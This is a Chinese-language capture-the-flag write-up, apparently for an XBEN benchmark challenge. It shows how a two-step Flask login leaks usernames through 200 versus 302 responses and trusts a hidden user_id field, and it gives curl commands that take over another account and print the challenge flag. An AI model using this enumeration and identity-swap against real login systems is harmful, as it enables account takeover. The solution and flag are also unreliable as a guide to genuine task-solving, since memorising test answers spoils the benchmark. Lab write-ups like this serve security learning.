## 题解

### 入口与指纹

`Apache/2.4.67 (Debian)` + Flask，Trading Platform 模板（与 `xben-001/002/003-24` 同族）。
首页注释给出 `test:test`，登录分两步：

```text
POST /                 username=test        → 302 /password/test
POST /password/test    username=test&user_id=10032&password=test
                                            → 302 /dashboard
```

`/password/<username>` 页面里有**隐藏字段** `username` 和 `user_id`：

```html
<input type="hidden" name="username" value="test">
<input type="hidden" name="user_id" value="10032">
```

### 关键观察

**1. `/password/<username>` 是用户名存在性 oracle。**

存在的用户返回 200（带隐藏 `user_id`），不存在的用户 302 `/?error=User+not+found`。
用字典扫一遍，发现第二个用户：

```text
/password/flag  → 200，隐藏字段 user_id=10141
```

**2. 口令校验按 URL 里的 `username`，会话身份却取 POST 里的 `user_id`。**

也就是说这两件事用了不同的用户来源：

| 来源 | 用途 |
| --- | --- |
| URL `/password/test` | 校验 `password=test` 是否正确 |
| POST `user_id` | 写入 `session['user_id']` |

于是用**自己的口令**通过校验，却把会话身份换成别人的 ID：

```bash
POST /password/test
username=test&user_id=10141&password=test
→ 302 /dashboard
```

`/dashboard` 渲染：

```text
Welcome, Flag flag{df80d08e-01c2-45c7-90b1-423995cf4434}
```

### 利用链

```bash
T=$(head -1 .target)
cj=$(mktemp)

# 1. 枚举出 flag 用户并读它的 user_id
curl -sS "http://$T/password/flag" | grep -o 'name="user_id" value="[0-9]*"'
# name="user_id" value="10141"

# 2. 用自己的密码，但把隐藏 user_id 换成 10141
curl -sS -c $cj -b $cj -X POST -d 'username=test' "http://$T/"
curl -sS -c $cj -b $cj -X POST \
  -d 'username=test&user_id=10141&password=test' "http://$T/password/test"

# 3. 以 flag 用户身份看 dashboard
curl -sS -b $cj "http://$T/dashboard" | grep -o 'Welcome[^<]*'
```

### flag 位置

`flag` 用户的 `first_name`/`last_name`，由 `/dashboard` 的 “Welcome, …” 直接渲染。

## 复盘

- **两步登录里「校验主体」和「建立会话的主体」可能不是同一个字段。**
  先分别定位每个参数控制什么，再组合：用自己的口令过校验，用目标 `user_id` 建会话。
- **隐藏字段要在 HTML 里读，不要猜。** `/password/<username>` 直接给出了目标用户的 `user_id`；
  没有这一步就会像之前一样在 10000–10060 里盲扫。
- 用户枚举用「200 vs 302」比登录报错更干净。
- 这条思路来自同模板的 `xben-003-24`（`X-UserId` 头 IDOR）：同一个模板族的越权点往往
  在「服务端信任了客户端提交的身份字段」上，只是入口从请求头换成了隐藏表单字段。
